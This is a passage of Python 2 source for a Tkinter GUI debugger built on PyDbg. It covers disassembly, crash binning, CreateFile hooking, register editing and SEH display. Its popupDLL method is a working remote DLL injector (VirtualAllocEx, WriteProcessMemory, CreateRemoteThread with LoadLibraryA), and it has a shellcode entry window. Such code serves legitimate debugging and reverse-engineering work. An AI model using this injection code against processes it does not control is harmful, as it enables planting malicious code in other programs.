        #    print("%.8x: %-32s %s" % (offset, hexdump, instruction))

        # It could also be used as a returned list:
        l = distorm3.Decode(offset, code, dt)
        for (offset, size, instruction, hexdump) in l:
             print("%.8x: %-32s %s" % (offset, hexdump, instruction))
        
        line = mystdout.getvalue()
        self.textPad.insert('1.0', line)
        #self.print2(line)
        self.print2("Number of bytes disassembled: %d" % num_bytes)
        self.print2("Disassembled:%s" % self.OPEN)
        self.nocolor = True
        self.highlighter(1)
        #t = threading.Thread(target=self.highlighter)
        #t.daemon = True
        #t.start()

    def RepresentsInt(self, s):
        try: 
            int(s)
            return True
        except ValueError:
            return False

    def CrashDebug(self, pid):
        print "Starting..."
        #old_stdout = sys.stdout
        #sys.stdout = mystdout = StringIO()
        # Utility libraries included with PyDbg
        # This is our access violation handler
        def check_accessv(dbg):
        # We skip first-chance exceptions
            if dbg.dbg.u.Exception.dwFirstChance:
                return DBG_EXCEPTION_NOT_HANDLED

            crash_bin = utils.crash_binning.crash_binning()
            crash_bin.record_crash(dbg)
            self.print2(crash_bin.crash_synopsis())
            dbg.terminate_process()
            return DBG_EXCEPTION_NOT_HANDLED
        
        if not self.RepresentsInt(pid):
            dbg.load(self.OPEN)
        else:
            dbg.attach(int(pid))
        self.get_dlls()
        dbg.set_callback(EXCEPTION_ACCESS_VIOLATION,check_accessv)
        self.breakpointset("pydbg")
        dbg.run()
        #line = mystdout.getvalue()
        #self.print2(line)
        self.crash = True
        
    def GetLib(self, pid):
        target_process = pid
        pid_is_there = False
        self.print2("[*]Starting...")
        def handler_CreateFileW(dbg):
            Filename = ""
            addr_FilePointer = dbg.read_process_memory(dbg.context.Esp + 0x4, 4)
            addr_FilePointer = struct.unpack("<L", addr_FilePointer)[0]
            Filename = dbg.smart_dereference(addr_FilePointer, True)
            self.print2("[*]CreateFileW -> %s" % Filename)
            return DBG_CONTINUE
        def handler_CreateFileA(dbg):
            offset = 0
            buffer_FileA = ""
            addr_FilePointer = dbg.read_process_memory(dbg.context.Esp + 0x4, 4)
            addr_FilePointer = struct.unpack("<L", addr_FilePointer)[0]
            buffer_FileA = dbg.smart_dereference(addr_FilePointer, True)
            self.print2("[*]CreateFileA -> %s" % buffer_FileA)
            return DBG_CONTINUE
        pid_is_there = True
        self.print2("[*]Attaching to %s" % target_process)
        if not self.RepresentsInt(pid):
            try:
                dbg.load(self.OPEN)
            except:
                self.print2("[*]Error: Is this right:%s" % self.OPEN)
        else:
            dbg.attach(int(pid))
        self.get_dlls()
        function2 = "CreateFileW"
        function3 = "CreateFileA"
        CreateFileW = dbg.func_resolve_debuggee("kernel32.dll","CreateFileW")
        CreateFileA = dbg.func_resolve_debuggee("kernel32.dll","CreateFileA")
        if CreateFileW == None:
            self.print2("[*]Resolving %s @ %08x" % (function2,CreateFileW))
        if CreateFileA == None:
            self.print2("[*]Resolving %s @ %08x" % (function3,CreateFileA))
        if CreateFileA == None:
            dbg.bp_set(CreateFileA, description="CreateFileA",handler=handler_CreateFileA)
        if CreateFileW == None:
            dbg.bp_set(CreateFileW, description="CreateFileW",handler=handler_CreateFileW)
        self.breakpointset("pydbg")
        dbg.debug_event_loop()
        self.highlighter(1)
                           
    def detach2(self):
        if (self.PID == None):
            dbg.detach()
            self.print2("Detached!!!")
        elif (self.OPENSTATE == None):
            dbg.detach()
            self.print2("Detached!!!")
        else:
            label = tkMessageBox.showinfo("Error", "You must attach or open a .exe first")
    
    def onExit(self):
        #debugger.detach()
        self.parent.destroy()

    def about_command(self):
        label = tkMessageBox.showinfo("About", "Python debugger \nGUI [Version 3.0] \nSee the GitHub repo for instructions")
                
    def clear(self):
            self.textPad.delete(1.0, 'end-1c')

    def popupPID(self):
        self.w=popupWindowPID(self.master)
        self.master.wait_window(self.w.top)
        self.PID = self.w.value
        self.print2("Using PID of %s" % self.PID)

    def popupDLL(self):
        print "Dll Injection only works for same bit process(ie. 32-32 bit or 64-64 bit), trying to inject into a different bit process will produve an error"
        #self.w=popupWindowDLL(self.master)
        #self.master.wait_window(self.w.top)
        #self.DLL = self.w.value
        self.DLL = tkFileDialog.askopenfile(mode='r',title='Select a dll',filetypes=[("Dynamic Libraries", "*.dll")] )
        self.DLL = self.DLL.name
        print self.DLL
        self.w=popupWindowDLL2(self.master)
        self.master.wait_window(self.w.top)
        self.DLLPID = int(self.w.value)
        if self.DLLPID == "":
            if self.PID:
                self.DLLPID = self.PID
            else:
                label = tkMessageBox.showinfo("Error", "You must attach or input a pid to inject a dll")
        # Define constants we use
        PAGE_RW_PRIV = 0x04
        PROCESS_ALL_ACCESS = 0x1F0FFF
        VIRTUAL_MEM = 0x3000
        self.print2( "[+] Starting DLL Injector")
        LEN_DLL = len(self.DLL)# get the length of the DLL PATH 
        self.print2( "\t[+] Getting process handle for PID:%d " % self.DLLPID )
        hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,self.DLLPID)
        if hProcess is None:
            self.print2( "\t[+] Unable to get process handle")
            sys.exit(0)
        self.print2("\t[+] Allocating space for DLL PATH")
        DLL_PATH_ADDR = kernel32.VirtualAllocEx(hProcess, 
                                                0,
                                                LEN_DLL,
                                                VIRTUAL_MEM,
                                                PAGE_RW_PRIV)
        bool_Written = c_int(0)
        self.print2( "\t[+] Writing DLL PATH to current process space")
        kernel32.WriteProcessMemory(hProcess,
                                    DLL_PATH_ADDR,
                                    self.DLL,
                                    LEN_DLL,
                                    byref(bool_Written))
        self.print2( "\t[+] Resolving Call Specific functions & libraries")
        kernel32DllHandler_addr = kernel32.GetModuleHandleA("kernel32")
        self.print2( "\t\t[+] Resolved kernel32 library at 0x%08x" % kernel32DllHandler_addr)
        LoadLibraryA_func_addr = kernel32.GetProcAddress(kernel32DllHandler_addr,"LoadLibraryA")
        self.print2( "\t\t[+] Resolve LoadLibraryA function at 0x%08x" %LoadLibraryA_func_addr )
        thread_id = c_ulong(0) # for our thread id
        self.print2( "\t[+] Creating Remote Thread to load our DLL")
        if not kernel32.CreateRemoteThread(hProcess,
                                None,
                                0,
                                LoadLibraryA_func_addr,
                                DLL_PATH_ADDR,
                                0,
                                byref(thread_id)):
            self.print2( "[-] Injection Failed, exiting")
            line = kernel32.GetLastError()
            if line == "5" or line == 5:
                self.print2("[*] Revieved error code 5, are trying to inject into 32 bit process from a 64 bit or vice versa...")
        else:
            self.print2( "[+] Remote Thread 0x%08x created, DLL code injected" % thread_id.value)

        
    def popupOPEN2(self):
        self.file = tkFileDialog.askopenfile(mode='r',title='Select an executable',filetypes=[("Executable Files", "*.exe")] )
        self.OPEN = self.file.name
        self.OPENSTATE = True
        self.print2("Application:%s" % self.OPEN)

    def popupOPEN(self):
        self.w=popupWindowOPEN(self.master)
        self.master.wait_window(self.w.top)
        self.OPEN = self.w.value
        self.OPEN.strip()
        self.OPEN.strip("")
        self.OPEN.strip("\r")
        self.OPENSTATE = True
        self.print2("Application:%s" % self.OPEN)

    def popupEVENT1(self):
        t = threading.Thread(target=popupWindowEVENT(self.master))
        t.daemon = True
        t.start()

    def popupEVENTS(self):
        self.w=popupWindowEVENT(self.master)
        self.master.wait_window(self.w.top)

    def popupTHREAD(self):
        if self.PID == self.OPEN:
            self.print2("[-] You must open or attach first...")
            return False
        i = 0;
        for thread_id in dbg.enumerate_threads():
            thread_handle  = dbg.open_thread(thread_id)
            context = dbg.get_thread_context(thread_handle)
            self.print2("[*] Dumping registers for threads:")
            self.print2("[**] Thread ID:%03d: %08x EIP: %08x" % (i,thread_handle,context.Eip))
            self.print2("[**] Thread ID:%03d:: %08x ESP: %08x" % (i,thread_handle,context.Esp))
            self.print2("[**] Thread ID:%03d:: %08x EBP: %08x" % (i,thread_handle,context.Ebp))
            self.print2("[**] Thread ID:%03d:: %08x EAX: %08x" % (i,thread_handle,context.Eax))
            self.print2("[**] Thread ID:%03d:: %08x EBX: %08x" % (i,thread_handle,context.Ebx))
            self.print2("[**] Thread ID:%03d:: %08x ECX: %08x" % (i,thread_handle,context.Ecx))
            self.print2("[**] Thread ID:%03d:: %08x EDX: %08x" % (i,thread_handle,context.Edx))
            i += 1
        line = dbg.seh_unwind()
        synopsis = "\n[+]SEH Chain\n"
        for (addr, handler_str) in line:
            synopsis +=  "\t%08x -> %s\n" % (addr, handler_str)
        self.print2(synopsis)
            
    def export(self):
        data = self.textPad.get(1.0, 'end-1c').encode('utf-8')
        if self.PID is None:
            line = "Debugger-Data-%s.txt" % (os.path.basename(os.path.normpath(self.OPEN)))
            file = open(line, "w")
            file.write(data)
            file.close()
            self.print2("Exported to '%s'" % line)
        elif self.OPEN is None:
            line = "Debugger-Data-%s.txt" % self.PID
            file = open(line, "w")
            file.write(data)
            file.close()
            self.print2("Exported to '%s'" % line)
        else:
            line = "Debugger-Data-for-who-knows-what.txt"
            file = open(line, "w")
            file.write(data)
            file.close()
            self.print2("Exported to '%s'" % line)

    def entryValue(self):
        return self.w.value

    def start(self):
        if self.breakmode:
            self.pause = False
            self.breakmode = False
            return True
        if self.libModeState:
            self.InitPyDBG()
            if self.OPENSTATE:
                self.print2("[-]Unable to set breakpoints with 'open' method, try attaching")
                data = "%s" % self.OPEN
                t = threading.Thread(target=self.GetLib, args=(data,))
                t.daemon = True
                t.start()
                return True
            else:
                data = "%s" % self.PID
                t = threading.Thread(target=self.GetLib, args=(data,))
                t.daemon = True
                t.start()
                return True
        if self.crashModeState:
            self.InitPyDBG()
            if self.OPENSTATE:
                data = "%s" % self.OPEN
                t = threading.Thread(target=self.CrashDebug, args=(data,))
                t.daemon = True
                t.start()
                return True
            else:
                print "Crash mode [DEBUG]"
                data = "%s" % self.PID
                print data
                t = threading.Thread(target=self.CrashDebug, args=(data,))
                t.daemon = True
                t.start()
                print "New Thread Started..."
                return True
        elif self.OPENSTATE:
            self.InitPyDBG()
            t = threading.Thread(target=self.load, args=(self.OPEN,))
            t.daemon = True
            t.start()
            return True
        else:
            m = self.check()
            if (m == False):
                return False
            print "TMP TMP TMP TMP"
            self.InitPyDBG()
            t = threading.Thread(target=self.debug)
            t.daemon = True
            t.start()
            return True

    def open(self):
        self.location = tkFileDialog.askopenfile(mode='rb',title='Select a file')
        self.load(self.location.name)

    def screen(self, text):
        self.textPad.insert('1.0', text)
        return True

    def check(self):
        if (self.PID is None)&(self.OPEN is None):
            label = tkMessageBox.showinfo("Error", "You must attach first")
            return False
        else:
            num = 1
            
    def debug(self):
        if self.PID is None:
            label = tkMessageBox.showinfo("Error", "You must open an executable first")
            return False
        dbg.attach(int(self.PID))
        self.get_dlls()
        self.breakpointset("pydbg")
        dbg.run()
                
    def load(self,path_to_exe):
        if self.OPEN is None:
            label = tkMessageBox.showinfo("Error", "You must open an executable first")
            return False
        dbg.load(self.OPEN)
        self.get_dlls()
        self.breakpointset("pydbg")
        dbg.run()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass
        
            
class popupWindowPID(object):
    
    def __init__(self,master):
        print "[*]PID window opened"
        top=self.top=Toplevel(master)
        self.top.geometry("200x75+300+300")
        self.l=Label(top,text="PID")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]Destroying PID window(If you entered nothing, expect an error)"
        self.value=self.e.get()
        self.top.destroy()
        print "[+]Added PID: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"
class popupWindowEVENT(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("320x135+300+300")
        self.l=Label(top,text="0x1 EXCEPTION_DEBUG_EVENT         u.Exception\n0x2 CREATE_THREAD_DEBUG_EVENT       u.CreateThread\n0x3 CREATE_PROCESS_DEBUG_EVENT       u.CreateProcessInfo\n0x4 EXIT_THREAD_DEBUG_EVENT         u.ExitThread\n0x5 EXIT_PROCESS_DEBUG_EVENT       u.ExitProcess\n0x6 LOAD_DLL_DEBUG_EVENT          u.LoadDll\n0x7 UNLOAD_DLL_DEBUG_EVENT        u.UnloadDll\n0x8 OUPUT_DEBUG_STRING_EVENT        u.DebugString\n0x9 RIP_EVENT         u.RipInfo")
        self.l.pack()
        #self.e=Entry(top)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()
        #self.textPad2 = ScrolledText(self)
        #self.textPad2.grid(row=1, column=0, columnspan=2, rowspan=4, padx=5, sticky=E+W+S+N)
        #self.textpad2.pack()
        
    def cleanup(self):
        self.value=self.e.get()
        self.top.destroy()

class popupWindowOPEN(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("200x75+300+300")
        self.l=Label(top,text="Executable")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass
        
    def cleanup(self):
        self.value=self.e.get()
        self.top.destroy()

    def clip(self):
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    
class popupWindowDLL(object):
    
    def __init__(self,master):
        print "[*]PID window opened"
        top=self.top=Toplevel(master)
        self.top.geometry("200x75+300+300")
        self.l=Label(top,text="DLL to inject")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]Destroying PID window(If you entered nothing, expect an error)"
        self.value=self.e.get()
        self.top.destroy()
        print "[+]Added PID: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowDLL2(object):
    
    def __init__(self,master):
        print "[*] Injection window opened"
        top=self.top=Toplevel(master)
        self.top.geometry("200x75+300+300")
        self.l=Label(top,text="               PID to inject into\n(Leave blank for debug process)")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "\t[*] Destroying injection window(If you entered nothing, expect an error)"
        self.value=self.e.get()
        self.top.destroy()
        print "[+] Added PID: %s" % self.value
        print "[*] Hit Start or select  a different engine from the debug menu"

class popupWindowDIR(object):
    
    def __init__(self,master):
        print "[*]Dir window opened"
        top=self.top=Toplevel(master)
        self.top.geometry("200x100+300+300")
        self.l=Label(top,text="Extra dir to monitor\n(tmp dirs are pre-included)\n(leave blank if you have none)")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying DIR window(If you entered nothing, expect an error)"
        self.value=self.e.get()
        self.top.destroy()
        print "[+]\t\tAdded Dir: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowINJECT(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("300x200+300+300")
        self.l=Label(top,text="Shellcode:")
        self.l.pack()
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack(side="right")
        #self.e=Entry(top)
        self.e = ScrolledText(top)
        self.e.pack()
        self.e.bind('<Button-3>',self.rClicker, add='')
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Shellcode window(If you entered nothing, expect an error)"
        self.value=data = self.e.get(1.0, 'end-1c')
        self.top.destroy()
        print "[+]\t\tAdded shellcode: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowCHANGE(object):
    
    def __init__(self, master):
        top=self.top=Toplevel(master)
        self.top.geometry("300x200+300+300")
        acts = ['EAX', 'EBX', 'ECX', 'EDX', 'ESI', 'EDI', 'ESP', 'EBP', 'EIP']
        lb = Listbox(top)
        for i in acts:
            lb.insert(END, i) 
        lb.bind("<<ListboxSelect>>", self.onSelect)
        lb.pack(side="right")
        self.var = StringVar()
        self.var.set(None)
        self.l=Label(top,text="Value:")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.L=Label(top,text="Thread:")
        self.L.pack()
        self.E=Entry(top)
        self.E.pack()
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack()
        #self.e.bind('<Button-3>',self.rClicker, add='')
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")

        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Register window(If you entered nothing, expect an error)"
        self.value1=data = self.e.get()
        print "[+]\t\tAdded[%s]: %s" % (self.value, self.value1)
        self.reg_set(self.value, self.value1)
        print "[*]Hit Start or select  a different engine from the debug menu"
        self.top.destroy()

    def reg_set(self, register, content):
        dbg.suspend_all_threads()
        try:
            #content = int(content, 0)
            content = int(content, 16)
        except:
            label = tkMessageBox.showinfo("Error", "Not a valid address:%s" % content)
        if register == "EAX":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Eax = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EAX value[Thread %s]: 0x%08x" % (thread_id, thread_context.Eax))
            dbg.resume_all_threads()
        elif register == "EBX":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Ebx = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EBX value[Thread %s]: 0x%08x" % (thread_id, thread_context.Ebx))
            dbg.resume_all_threads()
        elif register == "ECX":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Ecx = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New ECX value[Thread %s]: 0x%08x" % (thread_id, thread_context.Ecx))
            dbg.resume_all_threads()
        elif register == "EDX":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Edx = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EDX value[Thread %s]: 0x%08x" % (thread_id, thread_context.Edx))
            dbg.resume_all_threads()
        elif register == "ESI":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Esi = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New ESI value[Thread %s]: 0x%08x" % (thread_id, thread_context.Esi))
            dbg.resume_all_threads()
        elif register == "EDI":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Edi = content
                dbg.set_thread_context(thread_context,0,thread_id)
